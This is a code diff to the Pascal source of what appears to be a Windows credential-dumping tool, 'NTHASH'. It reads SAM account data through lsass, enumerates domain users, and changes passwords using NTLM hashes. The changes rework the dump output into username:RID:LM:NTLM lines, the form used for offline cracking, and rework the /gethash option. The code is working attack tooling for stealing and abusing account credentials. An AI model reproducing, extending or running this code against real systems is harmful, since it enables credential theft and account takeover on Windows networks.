@@ -7,6 +7,7 @@ uses windows,classes,sysutils,dos,
 
 type tdomainuser=record
      domain_handle:thandle;
+     username:string;
      rid:dword;
 end;
 pdomainuser=^tdomainuser;
@@ -15,7 +16,7 @@ pdomainuser=^tdomainuser;
 var
   lsass_pid:dword=0;
   p:dword;
-  pid,hash,server,user,oldhash,newhash,oldpwd,newpwd,password:string;
+  pid,server,user,oldhash,newhash,oldpwd,newpwd,password:string;
   oldhashbyte,newhashbyte:tbyte16;
   myPsid:PSID;
   mystringsid:pchar;
@@ -274,6 +275,7 @@ var
   status:ntstatus;
   userhandle_:thandle=thandle(-1);
   userinfo:PSAMPR_USER_INTERNAL1_INFORMATION;
+  lm,ntlm:string;
 begin
 result:=0;
 if param<>nil then
@@ -291,8 +293,9 @@ if param<>nil then
      else log ('SamQueryInformationUser ok',status);
      if status=0 then
      begin
-     if (userinfo^.LmPasswordPresent=1 ) then log('LmPassword:'+HashByteToString (tbyte16(userinfo^.EncryptedLmOwfPassword)  ),1);
-     if (userinfo^.NtPasswordPresent=1) then log('NTLmPassword:'+HashByteToString (tbyte16(userinfo^.EncryptedNtOwfPassword) ),1);
+     if (userinfo^.LmPasswordPresent=1 ) then lm:=HashByteToString (tbyte16(userinfo^.EncryptedLmOwfPassword)  );
+     if (userinfo^.NtPasswordPresent=1) then ntlm:=HashByteToString (tbyte16(userinfo^.EncryptedNtOwfPassword )  );
+     log(pdomainuser (param).username +':'+inttostr(pdomainuser (param).rid) +':'+lm+':'+ntlm,1);
      result:=1;
      SamFreeMemory(userinfo);
      end;
@@ -347,7 +350,7 @@ if (status=0) or (status=$00000105) then
    ptr:=buffer;
    for i:=1 to count do
        begin
-       log('domain:'+strpas(PSAMPR_RID_ENUMERATION(ptr).Name.Buffer),1);
+       log(strpas(PSAMPR_RID_ENUMERATION(ptr).Name.Buffer),1);
        //if func<>nil then fn(func)(@param );
        inc(ptr,sizeof(_SAMPR_RID_ENUMERATION));
        end;
@@ -461,11 +464,13 @@ if (Status <> 0) and (status<>$00000105) then
       ptr:=buffer;
       for i:=1 to count do
           begin
-          log('user:'+strpas(PSAMPR_RID_ENUMERATION(ptr).Name.Buffer)+' RID:'+inttostr(PSAMPR_RID_ENUMERATION(ptr).RelativeId ),1);
+          if func=nil
+             then log(strpas(PSAMPR_RID_ENUMERATION(ptr).Name.Buffer)+':'+inttostr(PSAMPR_RID_ENUMERATION(ptr).RelativeId ),1);
           if func<>nil then
              begin
              domainuser.rid :=PSAMPR_RID_ENUMERATION(ptr).RelativeId ;
              domainuser.domain_handle :=domainhandle_;
+             domainuser.username :=strpas(PSAMPR_RID_ENUMERATION(ptr).Name.Buffer);
              fn(func)(@domainuser );
              end;
           inc(ptr,sizeof(_SAMPR_RID_ENUMERATION));
@@ -853,7 +858,7 @@ begin
   log('NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newpwd:xxx',1);
   log('NTHASH /changentlm [/server:hostname] /user:username /oldpwd:xxx /newhash:xxx',1);
   log('NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newhash:xxx',1);
-  log('NTHASH /gethash:password',1);
+  log('NTHASH /gethash /password:password',1);
   log('NTHASH /getsid /user:username [/server:hostname]',1);
   log('NTHASH /getusers [/server:hostname]',1);
   log('NTHASH /getdomains [/server:hostname]',1);
@@ -881,15 +886,6 @@ begin
      dumpsam (lsass_pid ,'');
      exit;
      end;
-  p:=pos('/gethash:',cmdline);
-  if p>0 then
-       begin
-       hash:=copy(cmdline,p,255);
-       hash:=stringreplace(hash,'/gethash:','',[rfReplaceAll, rfIgnoreCase]);
-       delete(hash,pos(' ',hash),255);
-       log (GenerateNTLMHash (hash),1);
-       exit;
-       end;
   p:=pos('/server:',cmdline);
   if p>0 then
        begin
@@ -913,6 +909,12 @@ begin
            password:=stringreplace(password,'/password:','',[rfReplaceAll, rfIgnoreCase]);
            delete(user,pos(' ',password),255);
            //log(user);
+           end;
+    p:=pos('/gethash',cmdline);
+      if p>0 then
+           begin
+           log (GenerateNTLMHash (password),1);
+           exit;
            end;
   p:=pos('/getusers',cmdline);  //temporary
   if p>0 then
